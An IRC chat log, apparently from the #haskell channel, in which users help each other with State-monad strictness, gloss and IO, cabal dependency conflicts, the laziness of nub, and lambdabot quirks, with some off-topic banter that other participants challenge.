12:09:54 <johnw> that post appeared on haskell-cafe after a long discussion with its author here
12:10:07 <bwr> its weird though i had previously tried modify $! ...
12:10:11 <bwr> would that not be the same thing?
12:10:12 <johnw> I think we collectively spent about 4 hours tracking it down to the strict state monad not being strict in its state :)
12:10:30 <bwr> that seems a little confusing... what does the strict state monad give you then?
12:10:49 <johnw> it's strict in its actions
12:11:26 <johnw> modify $! only forces evaluation of the function you're passing to modify
12:11:41 <johnw> i.e., it forces 'f', not 'f x' (where x is the current state)
12:12:09 <bwr> johnw: ah, i see
12:12:23 <johnw> so, you had millions upon millions of Map.insert calls on your stack
12:15:33 <monochrom> bwr: see my http://hpaste.org/41790/ for what is State.Lazy and therefore what is State.Strict
12:17:46 <monochrom> also, this whole saga is why I keep saying "don't opine", "use the scientific method"
12:18:55 <monochrom> when you spend 4 hours, or 4 days, it's because during the first 3.5 hours, or 3.5 days, you opine, and opine wrong, and not know it because you have no evidence
12:19:44 <monochrom> in the last 0.5 hours, or 0.5 days, you finally use experiments or read the source code to see you have been in a goose chase
12:20:16 <monochrom> the same experiments or reading the source code could have been done at the first minute
12:26:07 <monochrom> the Western world have been using the scientific method for about 300 years. China has been using the opinionative method for about 3000 years. it completely explains why China has 4 great inventions to boast about (paper, compass, gunpowder, press), and the Western world doesn't because there are too many even greater inventions to list
12:26:29 <monochrom> the scientific method is extremely efficient in nailing causes and solutions
12:27:13 <acowley> You enjoy opining on this subject, don't you?
12:27:20 <monochrom> yes
12:27:47 <ReinH> How do people generally create new haskell projects w/ cabal? Manually? Are there project generators?
12:27:57 <dcoutts> cabal init
12:28:01 <acowley> Write some code, then do cabal init
12:28:29 <ParahSailin> monochrom: you're forgetting the iron smelting, the plough, seed drill...
12:28:49 <acowley> I say "write some code" first because cabal init populates your build-depends section for you.
12:29:25 <sproingie> china's greatest success is in creating a single identity of a single place called "China" for thousands of years despite all the dynasties and interregnums
12:29:30 <Philippa_> monochrom: citation needed
12:29:35 <mischov> Aeson question: I know how to convert an object via "instance FromJSON", but how would I convert an array of said objects?  ie. [{"iam":"value"}{"iam":"confusing"}]
12:29:41 <Philippa_> "completely explains" is a strong statement
12:30:17 <ReinH> acowley: seems like a chicken/egg problem... I want to set up test-framework so I can test the code I'm writing. ;)
12:30:55 <acowley> ReinH: "cabal init" is the chicken. Writing some code before running cabal init just bootstraps the egg-making process.
12:30:59 <Philippa_> (not to mention, "the scientific method" says nothing about how you generate your hypotheses or what to do in the meantime if you can't amass a strong enough dataset - something that sure as hell occurs a lot in /my/ life)
12:31:02 <ReinH> acowley: :)
12:32:08 <chrisdotcode> so guys, how do I turn an IO Picture into a Picture (using gloss). I tried: picture >>= (
12:32:18 <chrisdotcode> * picture >>= (\x -> x)
12:32:21 <chrisdotcode> and that didn't work
12:32:36 <chrisdotcode> there's do notation, but how do I do it without it?
12:32:50 <acowley> Use gloss's IO interface
12:32:54 <monochrom> please don't "turn an IO Picture into a Picture". please just don't. also, it is never needed
12:33:17 <acowley> e.g. http://hackage.haskell.org/packages/archive/gloss/1.7.8.2/doc/html/Graphics-Gloss-Interface-IO-Animate.html
12:33:25 <sproingie> you don't "turn IO anything into anything".  you can use it from within IO as if it weren't, but you'll never truly take the IO off of it
12:33:29 <monochrom> you have "picture >>= (\x -> ..." and that is quite enough. x is already a Picture. now use it inside the "..."
12:33:34 <sproingie> since main runs in IO this shouldn't be a big problem
12:33:48 <chrisdotcode> monochrom: yeah, I figured it wasn't needed, since I would just use the value inside of it.
12:34:16 <acowley> sproingie: The classic gloss interfaces want a function that produces a Picture
12:34:23 <acowley> sproingie: It subsumes main in that sense
12:34:27 <chrisdotcode> this is what I have so far:
12:34:29 <hpaste> chrisdotcode pasted ‚Äúgloss and io picture‚Äù at http://hpaste.org/87514
12:34:46 <acowley> ah, well, nm me then
12:35:08 <monochrom> that's gross..
12:35:20 <chrisdotcode> I'm just a newbie...
12:35:34 <chrisdotcode> I tried picture >>= (\x -> x) for that last line, but it didn't work.
12:35:39 <monochrom> no, not your code. the requirements of display
12:35:44 <chrisdotcode> oh haha
12:35:51 <acowley> Newbie answer: Write a do block, bind the result of running the picture action, then use that bound value in the call to display.
12:36:09 <chrisdotcode> acowley: yeah, I got that working, and I commited that. now I want to try it *without* the do block.
12:36:10 <chrisdotcode> :)
12:36:18 <bwr> monochrom: sorry, i was away for a bit; taking a look at your Lazy state example you gave me
12:36:22 <acowley> picture >>= display (‚Ä¶)
12:36:37 <chrisdotcode> huh. so you have to do it like that...
12:36:40 <monochrom> picture >>= \x ->  display ... x
12:36:47 <chrisdotcode> I wasn't quite sure what the parameters for display were.
12:36:51 <acowley> chrisdotcode: It works out nicely because the Picture is the last argument to display
12:37:07 <chrisdotcode> I thought it was just title, position, position. but there's also background color and picture to display that I don't know where it came from.
12:37:40 <chrisdotcode> oops. I was reading the wrong documentation page.
12:37:50 <chrisdotcode> okay, so picture >>= \x -> display ... x?
12:37:58 <acowley> Or my version
12:38:02 <chrisdotcode> is that the most haskellian way to do it?
12:38:04 <acowley> that elides naming x
12:38:31 <chrisdotcode> acowley: so is that points free?
12:38:34 <monochrom> I would write in do-notation normally
12:39:08 <acowley> Yeah, there's no right answer here. It's a matter of taste.
12:40:07 <chrisdotcode> monochrom: my do notation looks like this:
12:40:09 <hpaste> chrisdotcode revised ‚Äúgloss and io picture‚Äù: ‚Äúgloss and io, do notation‚Äù at http://hpaste.org/87514
12:40:36 <monochrom> yes, that's what I normally do too.
12:41:10 <chrisdotcode> alright, thanks monochrom, acowley :-)
12:42:47 <greg> hi
12:42:56 <greg> can anyone see me?
12:43:13 <Ankhers`> define see...
12:43:20 <Taneb> Hello, greg
12:43:25 <greg> lol, i take that as a yes
12:43:34 <greg> im reading why fp matters
12:43:48 <greg> trying to implement the code in haskell
12:43:48 <monochrom> yes, good article
12:43:49 <acowley> Nice shirt
12:44:07 <Taneb> greg: spoilers: it does matter
12:44:08 <monochrom> ok, some notational change, the article is old
12:44:48 <greg> it doesnt really say its haskell so i read it as mostly sudo code
12:45:03 <greg> do you guys use pastebin or anything like that?
12:45:11 <tommd> @where paste
12:45:12 <lambdabot> <http://hpaste.org/>, <http://paste.lisp.org/new>, <http://codepad.org/>
12:45:12 <sellout-> greg: ‚Äúsudo code‚Äù sounds dangerous ;)
12:45:34 <greg> lol oops
12:45:42 <greg> one second going to hpaste my stuff
12:45:43 <monochrom> I used MSDOS 3 through 6, all code has always been sudo code :)
12:46:13 <monochrom> sudo format a:
12:46:33 <monochrom> sudo gwbasic. etc.
12:46:43 <acowley> implicit sudos are the best sudos
12:47:11 <monochrom> oh! at one point I also had gcc DOS version. sudo gcc my.c
12:47:35 <monochrom> it was called djgpp, wasn't it?
12:48:17 <hpaste> greg pasted ‚Äúwhy?‚Äù at http://hpaste.org/87516
12:48:19 <geekosaur> yep
12:49:13 <sellout-> greg: myappend looks odds.
12:49:22 <sellout-> *odd
12:49:31 <greg> lol oh thats fine ;-)
12:49:38 <greg> its line 13 thats doing my nut
12:49:47 <sellout-> Oh, I see. nm, it behaves ;)
12:50:03 <sellout-> I was reading what I wanted to see, not what was there.
12:50:35 <greg> i really like the 'easy' way that the paper describes foldr
12:50:50 <greg> where the arguments replace cons and nil in the list
12:51:03 <greg> but now im trying to foldr a tree
12:51:09 <greg> and it doesnt want to behave
12:51:10 <Earnestly> kaictl: Well it's sort of working now
12:51:14 * geekosaur wonders why what
12:51:23 <sellout-> greg: What is happening?
12:52:31 <Earnestly> kaictl: So, I can now use systemctl --user fine, not sure what I did. Rewrote units from scratch and used -git. I still get a dbus-daemon error but it works. Currently dumped `systemd --user &' in zprofile which does the job (although I should add some logic to check if it's running)
12:52:44 <Earnestly> kaictl: Otherwise each new login shell starts it again
12:53:20 <greg>     Couldn't match type `Treeof t0' with `[d0]'
12:53:20 <greg>     Expected type: d
12:53:20 <greg>       Actual type: [d0]
12:53:20 <greg>     In the pattern: s1 : s2
12:53:20 <greg>     In an equation for `foldtree':
12:53:21 <greg>         foldtree f g a (s1 : s2)
12:53:21 <greg>           = g (foldtree f g a s1) (foldtree f g a s2)
12:53:22 <greg> Failed, modules loaded: none
12:53:26 <geekosaur> aaa don't paste into channe;
12:53:40 <greg> eek sorry! what should i have done?
12:53:46 <monochrom> greg: the article is playing fast and loose, conceptually correct but can't be haskell. you have to use 2 functions
12:53:56 <sellout-> greg: Use hpaste.
12:54:04 <geekosaur> send it to hpaste like you did the original code, possibly as an annotation
12:54:13 <greg> sure , apologies
12:54:39 <greg> @monochrom can you elaborate?
12:54:39 <lambdabot> Unknown command, try @list
12:54:45 <geekosaur> but in this case, the problem is that you cannot simulltaneously have one equation expecting a (Node label subtrees) and another for the same binding expect an (s1:s2)
12:56:18 <greg> ah perhaps i can make it so that d is of type [Treeof t]
12:56:35 <greg> and have [Node label subtrees] as the first case?
12:56:56 <geekosaur> and similarly for the EmptyTree case, yes
12:57:14 <greg> thanks you guys rule!
12:57:28 <giogadi> howdy everyone
12:57:31 <Earnestly> kaictl: So, for now, I'm using `if ! pgrep -u 1000 systemd; then systemd --user &; fi'
12:57:44 <giogadi> I'm having trouble with exporting modules with records
12:58:17 <giogadi> how do I get haskell to export the functions used to access each part of a record?
12:58:34 <geekosaur> module Foo ( MyType(..), ... ) where
12:59:10 <Breadmonster> Does anyone here use Emacs on Windows?
12:59:28 <sproingie> i do
12:59:31 <monoidal> giogadi: or module Foo (MyType(fun1, fun2), ...) but geekosaur's way is more usual
12:59:31 <chrisdotcode> hey guys, it seems I can't export both "Graphics.Gloss" and "System.Directory" because "GHCi runtime linker: fatal error: I found a duplicate definition for symbol
12:59:32 <chrisdotcode> fps_minimum
12:59:32 <chrisdotcode> whilst processing object file
12:59:32 <chrisdotcode> /home/cdc/.cabal/lib/bytestring-0.10.0.2/ghc-7.4.2/HSbytestring-0.10.0.2.o
12:59:32 <chrisdotcode> "
12:59:33 <hpaste> monochrom annotated ‚Äúwhy?‚Äù with ‚Äúwhy? valid haskell‚Äù at http://hpaste.org/87516#a87518
12:59:43 <monochrom> greg: see my paste
12:59:45 <Breadmonster> sproingie: How do I install Haskell mode?
12:59:56 <giogadi> thanks, I'll give that a try
13:00:01 <geekosaur> chrisdotcode, you have multiple versions of the bytestring package installed, probably
13:00:13 <sproingie> should just work out of the box.  it took a little massaging to make flymake work with it and i'm terribly afraid i've lost the changes i made to make it work
13:00:24 <chrisdotcode> geekosaur: the *only* think I've ever installed with cabal was gloss-examples...
13:00:34 <chrisdotcode> or installed for haskell in general.
13:00:49 <Breadmonster> sproingie: No, I mean, I can't even find the .emacs file
13:00:58 <chrisdotcode> geekosaur: a qualified import can't fix something like that?
13:01:01 <sproingie> search your filesystem luke, you know it to be there
13:01:15 <geekosaur> the only thiong you explicitly installed, but it may have (a) installed dependencies (b) stupidly assumed it should install new versions of system libraries too, which will pretty much guaranteed break things
13:01:27 <geekosaur> 'ghc-pkg list'
13:01:33 <sproingie> your .emacs.d probably isn't there, just create it.  first figure out what ~ expands to, i forget exactly how in emacs
13:01:44 <sproingie> my emacs-fu has become poor and weak over the years
13:01:54 <Breadmonster> Shit.
13:02:10 <sproingie> actually naming a folder starting with a dot in windows explorer is pure fail, so do it from cygwin or something
13:02:27 <giogadi> thanks for y'alls help, that worked!
13:02:33 <Breadmonster> I don't have Cygwin.
13:02:46 <hpaste> chrisdotcode pasted ‚Äúdependency hell‚Äù at http://hpaste.org/87519
13:02:50 <chrisdotcode> geekosaur: ^
13:03:03 <sproingie> get it then.  actually you can name .emacs.d whatever you want, you just have to add it in your .emacs
13:03:17 <geekosaur> chrisdotcode, yep, notice you have a newer bytestring in the local packages
13:03:25 <chrisdotcode> geekosaur: hrm... so how do I fix that?
13:03:46 <geekosaur> ghc-pkg unregister bytestring-0.10.0.2
13:04:16 <chrisdotcode> geekosaur: "ghc-pkg: unregistering bytestring-0.10.0.2 would break the following packages: repa-io-3.2.2.201204.1 repa-algorithms-3.2.2.201204.1 gloss-raster-1.7.7.201204.1 repa-3.2.2.201204.1 gloss-1.7.7.201204.1 bmp-1.2.3.4 binary-0.5.1.1 (use --force to override)
13:04:17 <chrisdotcode> "
13:04:21 <Ankhers`> laravel
13:04:22 <chrisdotcode> should I --force?
13:04:23 <Ankhers`> miss...
13:04:34 <geekosaur> it will probably complain about other things that require it, you'll need to remove those as well. and then reinstall your gloss-examples with --constraint 'bytestring installed'
13:04:58 <chrisdotcode> cabal install gloss-examples --constrain 'bytestring installed'?
13:04:58 <geekosaur> hm, it also installed a  newer OpenGL
13:05:15 * geekosaur looks for other duplicated libs
13:05:53 <geekosaur> actually, I think you can get away with the OpenGL duplication (hopefully)
13:06:08 <geekosaur> chrisdotcode, --constraint not --constrain
13:06:14 <monochrom> I hope it won't cause future problems
13:06:15 <chrisdotcode> oops
13:06:43 <chrisdotcode> so cabal uninstall gloss-examples; cabal install gloss-examples --constraint 'bytestring installed' ?
13:07:05 <monochrom> there is no "cabal uninstall". do you mean "ghc-pkg unregister"?
13:07:22 <chrisdotcode> oops, yeah that >_>
13:07:37 <monochrom> then yes
13:07:44 <chrisdotcode> so ghc-pkg unregister gloss-example; cabal install gloss-examples --constraint 'bytestring installed'
13:07:49 <chrisdotcode> alright, I'm trying it now...
13:07:49 <dEPy> could function lifting be done in javascript? O_o
13:08:02 <monochrom> what is function lifting?
13:08:10 <lispy> lambda lifting?
13:08:17 <dEPy> I mean lifting in general, no not lambda lifting
13:08:17 <monochrom> but perhaps ask a javascript channel and confuse them :)
13:08:22 <dEPy> lol :D
13:08:37 <lispy> what does lifting mean in general?
13:08:39 <monochrom> "lifting in general" is even less informative than "function lifting"
13:08:52 <dEPy> well for lifting I would first have functors or applicatives or monads right?
13:09:01 <simpson> Well, I'm thinking of the "do you even" variety personally.
13:09:30 <simpson> dEPy: Those are typeclasses.
13:10:04 <dEPy> simpson, what's your point. I dont get it? :/
13:10:10 <monochrom> ok, at this point "lifting" is of the same calibre as "RESTful"
13:10:27 <simpson> dEPy: I don't know what lifting means for Functors. Could you illustrate?
13:10:56 <dEPy> fmap is lifting a function to be able to operate on functors no?
13:11:04 <simpson> Okay, sure.
13:11:12 <dEPy> then for applicatives you have liftA... and for monads liftM...
13:11:23 <Breadmonster> Oh my god.
13:11:26 <simpson> So are you just talking about higher-order functions in general?
13:11:30 <Breadmonster> Emacs is a nightmare to work with.
13:11:36 <chrisdotcode> geekosaur: nope... I unregistered gloss (gloss-examples didn't exist), and reinstalled gloss-examples, and it's still giving the same errors.
13:11:37 <dEPy> simpson, I guess...
13:11:42 <Breadmonster> Isn't there a single Haskell IDE?
13:11:57 <Eduard_Munteanu> It's the crappy missing superclasses issues, otherwise one'd go with fmap all the way.
13:12:20 <geekosaur> chrisdotcode, you only unregistered that one and not the one causing the problem (bytestring-0.10.0.2)?
13:12:36 <chrisdotcode> oh, shoot. didn't know I had to do that too.
13:12:39 <simpson> Breadmonster: I hear things about Yi. Never used it myself.
13:12:42 <geekosaur> ...
13:13:04 <geekosaur> [08 15:59] <geekosaur> chrisdotcode, you have multiple versions of the bytestring package installed, probably
13:13:08 <monochrom> javascript has higher-order functions just fine
13:13:10 <chrisdotcode> hey, I don't know how haskell packages work yet... cut me some slack... ;_;
13:13:24 <monochrom> also, emacs is not a nightmare. for me anyway.
13:14:26 <monochrom> haskell packages work poorly. however, it is a price for awesome cross-module optimizations.
13:20:57 <Ankhers`> who said emacs was a nightmare?
13:21:09 <chrisdotcode> geekosaur: now I'm getting "gloss-1.7.6.5 depends on bmp-1.2.3.1 which failed to install."
13:22:30 <geekosaur> there should be error messages from that failed install atempt further back (if necessary rerun the install capturing the output)
13:24:26 <lispy> chrisdotcode: I would recommend unregistering all packages listed by ghc-pkg list --user (for each package something like ghc-pkg unregister --user <name of package>) and then using cabal-dev in the future. The price is that you have to compile comman packages in each sandbox, but the benefit is that you have fewer package conflicts.
13:24:32 <hpaste> chrisdotcode revised ‚Äúdependency hell‚Äù: ‚Äúmore dependecy hell...‚Äù at http://hpaste.org/87519
13:26:26 <chrisdotcode> lispy: where do I get cabal-dev?
13:26:28 <lispy> also, that's a weird error. It looks like bmp-1.2.3.1 is simply broken.
13:26:30 <johnw> lispy: but if you use cabal-dev for simply everything, then it gets sucky tracking down locally installed documentation
13:26:34 <lispy> chrisdotcode: cabal install cabal-dev
13:26:40 <chrisdotcode> figures xD
13:27:07 <monochrom> probably bmp-1.2.3.1 assumes new bytestring without saying it in dependency version bounds
13:27:08 <lispy> chrisdotcode: I'm sorry this is frustrating.
13:27:31 <monochrom> try to force an older bmp
13:27:31 <chrisdotcode> lispy: heh. I've faced much worse dependency problems with yum on fedora boxes :-)
13:28:07 <lispy> chrisdotcode: That doesn't make cabal hell okay :)
13:28:34 <chrisdotcode> lispy: guess not... why is cabal like this? monochrom was saying something about cross-module optimization? what's that?
13:29:09 <hpaste> kostja pasted ‚Äúlists and IO‚Äù at http://hpaste.org/87523
13:29:26 <lispy> chrisdotcode: why is cabal like this? Well that takes a while to explain. cross-module optimization referes to GHC's ability to inline things in one package into modules from another package.
13:29:36 <chrisdotcode> that's kind of awesome...
13:29:47 <dcoutts> chrisdotcode: we were trying to be clever by allowing more than one version of the same package to be installed at once, without realising the full implications of that (full implications are solvable but that's not what our tools do right now)
13:30:01 <lispy> chrisdotcode: Cabal has these issues because it is a weird mixture of build tool and package manager. It's okay at both but doesn't excel at either (yet)
13:30:03 <kostja> hi all. why is primes2 printing the list of primes on calculation, but primes not? how can I get primes to so?
13:30:21 <chrisdotcode> lispy, dcoutts: so will cabal every be replaced?
13:30:25 <chrisdotcode> (or fixed)
13:30:34 <dcoutts> chrisdotcode: yes fixed eventually
13:30:40 <dcoutts> and incrementally
13:30:47 <Lethalman> cabal is to apt like ghc-pkg is to dpkg?
13:31:09 <Peaker> xplat, read a long scrollback.. without MTPC can't write a decent MTL, perhaps, but in all my projects, I use transformers directly and avoid the MTL
13:31:19 <tgeeky> Lethalman: close enough.
13:31:35 <geekosaur> not exactly, since ghc-pkg isn't a real package manager, except in the limited ghc sense where "package" might better be understood as "library"
13:31:38 <efie> is it possible to build a lazy nub function?
13:31:41 <Peaker> xplat, I think the type-class approach to monad stacks is pretending that the ordering of the layers doesn't matter, which encourages subtly wrong semantics
13:32:10 <Peaker> > take 3 $ nub [1,2,2,3,1,2,3,undefined]
13:32:13 <lambdabot>   [1,2,3]
13:32:18 <lispy> efie: lazy in which sense, I believe nub is spine lazy but element strict at the moment
13:32:21 <Peaker> efie, nub is lazy.. ?
13:32:25 <chrisdotcode> lispy: so how do I remove all of my own user packages? `rm -r /home/cdc/.ghc/x86_64-linux-7.4.2/package.conf.d`?
13:32:30 <dcoutts> efie: nub is lazy
13:32:45 <ParahSailin> @src nub
13:32:46 <lambdabot> nub = nubBy (==)
13:32:50 <ParahSailin> @src nubBy
13:32:51 <lambdabot> nubBy eq []             =  []
13:32:51 <lambdabot> nubBy eq (x:xs)         =  x : nubBy eq (filter (\ y -> not (eq x y)) xs)
13:32:52 <dcoutts> > take 1 (nub ('x':undefined))
13:32:53 <immanuelkant> @ty undefined
13:32:57 <lambdabot>   "x"
13:32:58 <lambdabot> a
13:33:11 <immanuelkant> @ty undefined
13:33:15 <lambdabot> a
13:33:40 <lispy> Ah, so the element strictness of nub depends on the strictness of (==)
13:33:49 <scriptor> what's the etymology of nub?
13:33:57 <lispy> german, IIRC
13:34:04 <lispy> essence
13:34:05 <geekosaur> @wn nub
13:34:07 <lambdabot> *** "nub" wn "WordNet (r) 3.0 (2006)"
13:34:07 <lambdabot> nub
13:34:07 <lambdabot>     n 1: a small lump or protuberance [syn: {nub}, {nubble}]
13:34:07 <lambdabot>     2: a small piece; "a nub of coal"; "a stub of a pencil" [syn:
13:34:07 <lambdabot>        {nub}, {stub}]
13:34:09 <lambdabot> [7 @more lines]
13:34:33 <mauke> not any german I know
13:34:36 <Ankhers`> Is there a method that takes the first x elements from a list?
13:34:46 <Eduard_Munteanu> :t take
13:34:50 <lambdabot> Int -> [a] -> [a]
13:34:51 <dcoutts> scriptor: it's an english word, though it's use in english apparently comes from German   http://en.wiktionary.org/wiki/nub
13:34:55 <fizbin> > take 5 [1..]
13:34:57 <lambdabot>   [1,2,3,4,5]
13:35:44 <hpc> Ankhers`: the real question is, is there a way to drop the first x elements from a list ;)
13:35:44 <efie> I thought nub isn't lazy because in (nub [0..100000]) !! 100000  the first 100000th elements of the nubbed listed are hold in memory, instead of only wanting to keep the 100000th element; am I wrong?
13:35:55 <geekosaur> sounds like a good anglo-saxon monosyllable...
13:35:58 <Ankhers`> hpc: That would actually be better.
13:36:28 <tgeeky> http://zvon.org/other/haskell/Outputlist/nub_f.html
13:36:31 <tgeeky> "essence"
13:36:35 <lpvb> anyone use sublimehaskell know how to get a integrated repl?
13:36:43 <geekosaur> efie, if that is really the only use of it, it should not be holding the other elements around
13:36:43 <dcoutts> efie: that's a different issue to it being lazy
13:36:59 <hpc> zvon.org is an atrocious place to go for useful haskell information
13:37:43 <dcoutts> efie: consider what nub has to do, it has to maintain a set of elements that it has already seen, so that it knows which elements to put into the result list and which to filter out
13:37:52 <chrisdotcode> lispy: how do I remove all of my registered packages at once?
13:38:17 <dcoutts> efie: so it must maintain that set, the set of all elements it has seen so far, so yes it will hold all of them
13:38:29 <Peaker> efie, nub removes elements equal to *any* of the previous elements, not just to the direct previous element
13:38:41 <kostja> if I call a function recursively to append to a list, how can I make the list printing on calculation?
13:38:58 <dcoutts> efie: note that it is not retaining the output list itself, but it is retaining the elements. You could write nub to do that using a Set for example (which would make it more efficient)
13:39:50 <troydm> kostja: u can't without Monad's
13:40:08 <Peaker> kosmikus, It's typically better to prepend to a list than to append to it
13:40:15 <Peaker> kosmikus, and what is it you want to print, exactly?
13:40:36 <kostja> Peaker: for example here: http://hpaste.org/87523
13:40:39 <dcoutts> efie: make sense?
13:40:40 <troydm> Peaker: i think ur talking to the wrong person
13:41:45 <troydm> kostja: well the thing is to print u'll have to be in Monad context
13:41:52 <troydm> kostja: u can't print from pure code
13:41:59 <Peaker> oops
13:42:03 <efie> dcoutts: ok I see what you mean; so it isn't possible to build a nub which acts like "if I get the info that only the 100.000th elements is required, I will go through the list, keeping a counter at which unique element I am and give the 100.000 one back, maybe calculating the other ones later on"?
13:42:09 <Peaker> kostja, ^^ xchat name completion is dumb
13:42:11 <heatsink> kostja, where does your code append to a list?
13:42:32 <troydm> kostja: have you learned about IO Monad yet?
13:42:36 <kostja> heatsink: line 9
13:42:45 <kostja> troydm: yes
13:42:58 <Peaker> kostja,   length foo == 0   is a *very* bad way of doing "null foo"
13:43:02 <dcoutts> efie: you could do better if you know more about the input, and write a specialised version for that
13:43:15 <troydm> kostja: then you'll have to either, rewrite your code to a Writer monad and log the steps
13:43:16 <kostja> Peaker: yeah, should use null, but it doesn't matter
13:43:28 <troydm> or rewrite your code to use IO Monad and print as u go
13:43:34 <hpc> and null foo is a mediocre way of doing "case foo of [] -> z; (x:xs) -> f x xs"
13:43:49 <troydm> better to do it Writer Monad way however IO Monad will do too
13:43:58 <heatsink> kostja, In line 9, I see (k:ps), which prepends to a list.  It does not append.
13:44:02 <kostja> troydm: but why does primes2 does it?
13:44:05 <troydm> well it all depends on whatever you need to print and what for
13:44:05 <efie> dcoutts: how could this be done?
13:44:06 <dcoutts> efie: ah and you're also wondering if you could do better by combining the !! with the nub, hmm.
13:44:14 <efie> yeah
13:44:27 <kostja> heatsink: yeah, prepend, I'm sorry, my mistake
13:44:45 <troydm> kostja: does what?
13:44:50 <dcoutts> efie: and you want it in the original order, no sorting?
13:44:55 <kostja> troydm: this is only a testcase. I just want to understand what's behind it
13:45:06 <kostja> troydm: primes2 prints the numbers on the go
13:45:07 <efie> dcoutts: the order does not matter
13:45:23 <scriptor> efie: so you want to print them right before the prepend step?
13:45:54 <kostja> scriptor: I want to understand, why primes2 prints the list during the computation
13:46:08 <kostja> scriptor: and how I can make the faster computation of primes do the same
13:46:15 <heatsink> It doesn't print the list during the computation.
13:46:29 <kostja> heatsink: it does (or at least in ghci)
13:46:32 <dcoutts> efie: hmm, actually that doesn't make sense, if the order doesn't matter then how does the indexing with !! make any sense?
13:46:55 <heatsink> ghci prints the return value.
13:47:08 <troydm> kostja: well because it's lazy code that's why
13:47:16 <heatsink> Becuase Haskell is lazy, it can sometimes start printing the return value before it finishes computing.
13:47:33 <troydm> but that doesn't means to print a value as you go
13:47:35 <dcoutts> in fact it's only really the printing that causes it to be evaluated at all
13:47:38 <efie> dcoutts: um I wanted to say: assume I have [1,2,2,3] it can be nubbed to [1,2,3] or [3,2,1] as long as no !! has appeared
13:47:39 <kostja> so how can I make the first algorithm lazy?
13:47:46 <troydm> kostja: yes
13:48:04 <dcoutts> efie: is the input always ordered?
13:48:06 <kostja> troydm: yes, what?
13:48:07 <efie> dcoutts: of course if the i-th element was !!, the the i-th element of the nubbed list is fix (the rest not)
13:48:48 <efie> dcoutts: the elements of the list? hm no, but they could be ordered first
13:48:53 <troydm> kostja: yes apparently if your first primes function prints result only after it computes whole list and your second is lazy since it uses list comprehension
13:49:07 <troydm> u can thus rewrite the first one to be lazy
13:49:10 <heatsink> kostja, to evaluate the list lazily, the algorithm has to put the rest of the computation in the tail of the list.
13:49:13 <dcoutts> efie: of course sorting them will force them to all be in memory at once
13:49:27 <efie> oh
13:49:29 <dcoutts> efie: which is equiv to the nub
13:49:43 <efie> ok, that's I want to avoid
13:49:44 <heatsink> That is, one of the functions has to evaluate to a term of the form x : recursiveCall y
13:50:13 <kostja> heatsink: okay, I'm trying to do so. thank you!
13:50:31 <dcoutts> efie: hmm, I think that's a hard problem
13:50:56 <kostja> heatsink: but this can't work, because I need all calculated primes, to check the next numbers
13:51:09 <dcoutts> efie: in general I suspect it cannot be done in less than linear space, if you're just working in a context of elements that can be ordered.
13:51:55 <troydm> kostja: also using a length function to check whenever a number is prime or not is an overkill
13:52:19 <kostja> troydm: I replaces it with null
13:52:40 <troydm> you could use fold with Maybe result
13:52:57 <heatsink> kostja, what is needed to check number n?
13:52:59 <efie> dcoutts: I would be ok with this; do you have any hints for me how this could be realized?
13:53:16 <dcoutts> efie: well nub is using linear space of course
13:53:23 <kostja> heatsink: all primes less n?
13:53:36 <kostja> or less than sqrt(n)
13:53:44 <efie> dcoutts: oh sorry, I was reading time instead of space
13:53:46 <dcoutts> efie: you can do it more efficiently than nub, but I don't think you can do it in less space (asymptotically)
13:54:15 <dcoutts> efie: e.g. you can use a more efficient representation of the set of elements that have been seen already
13:54:27 <dcoutts> still linear
13:54:36 <heatsink> okay, so you can have a function prime :: [Int] -> Int -> Bool to do that
13:54:38 <dcoutts> still linear space that it
13:55:28 <kostja> heatsink: trying to do it
13:55:36 <dcoutts> efie: e.g. if you know that your elements are integers in a certain dense range then you can use a bit set
13:56:17 <dcoutts> efie: or construct a heap and take the k'th element
13:58:18 <efie> dcoutts: hm thank you for explanation!
13:58:41 <Desheng> how is Haskell's support for specific width integers? I want to write a program that reads in a raw file by the 16 bit signed integer and writes out other data of the same width
13:58:48 <heatsink> kostja, try writing a function primesSuffix :: [Int] -> Int -> Int -> [Int] such that, if you call primesSuffix xs m n, you get all primes between m and n.  Of course, this function will be recursive.
13:59:01 <dcoutts> efie: or look at partial sort algorithms
13:59:04 <heatsink> xs are the primes less than m.
13:59:08 <hpc> :k (Int32, Word32, Int8, Word8, Int64, Word64)
13:59:11 <lambdabot> *
13:59:25 <hpc> Desheng: quite good
13:59:28 <heatsink> Desheng, they're in library Data.Word and Data.Int
13:59:29 <Ankhers`> Anyone know the current status of the new platform?
13:59:54 <Desheng> thanks!
14:01:42 <efie> dcoutts: I'm thinking about reimplemting !! which skips an element if it has alredy been moved over such an element
14:02:33 <dcoutts> efie: the question is how does it know if it has seen that element already...
14:02:48 <efie> dcoutts: arg :D
14:02:49 <efie> sorry
14:02:53 <efie> yeah
14:02:53 <efie> um
14:04:21 <fizbin> > let t = foldl (\y x -> x:y) [] [0..] in take 5 t
14:04:27 <lambdabot>   mueval: ExitFailure 1
14:04:28 <lambdabot>  mueval: Prelude.undefined
14:05:00 <monochrom> hrm, interesting indeed
14:05:16 <fizbin> > 1 + 2
14:05:20 <lambdabot>   3
14:05:29 <fizbin> Just checking I didn't kill lambdabot...
14:06:21 <monochrom> > let ack 0 y = y+1; ack x 0 = ack (x-1) 1; ack x y = ack (x-1) (ack x (y-1)) in ack 5 5
14:06:26 <lambdabot>   mueval: ExitFailure 1
14:06:26 <lambdabot>  mueval: Prelude.undefined
14:06:44 <monochrom> yeah, it turns timeout into bottom, it seems
14:06:59 <monochrom> well, I am somewhat fine with that :)
14:07:07 <monochrom> > undefined
14:07:10 <lambdabot>   *Exception: Prelude.undefined
14:07:11 <fizbin> Well, not always.
14:07:16 <hpc> that's weird
14:07:28 <fizbin> > product [1..100]
14:07:32 <lambdabot>   933262154439441526816992388562667004907159682643816214685929638952175999932...
14:07:42 <fizbin> > product [1..1000]
14:07:46 <lambdabot>   402387260077093773543702433923003985719374864210714632543799910429938512398...
14:08:08 <fizbin> > product [1..(product [1..100])]
14:08:14 <lambdabot>   mueval: ExitFailure 1
14:08:14 <lambdabot>  mueval: Prelude.undefined
14:08:27 <fizbin> Huh. I thought the timeout error looked different.
14:09:00 <otters> It does
14:09:04 <monochrom> lambdabot - something new everyday :)
14:09:10 <otters> > product [1..product [1..100]]
14:09:14 <lambdabot>   can't find file: L.hs
14:09:20 <otters> uhh
14:09:22 <otters> ok
14:09:28 <monochrom> try again
14:09:33 <otters> > product [1..product [1..100]]
14:09:38 <lambdabot>   mueval: ExitFailure 1
14:09:38 <lambdabot>  mueval: Prelude.undefined
14:09:42 <otters> nice
14:09:49 <monochrom> "can't find file: L.hs" is some glitch or race condition
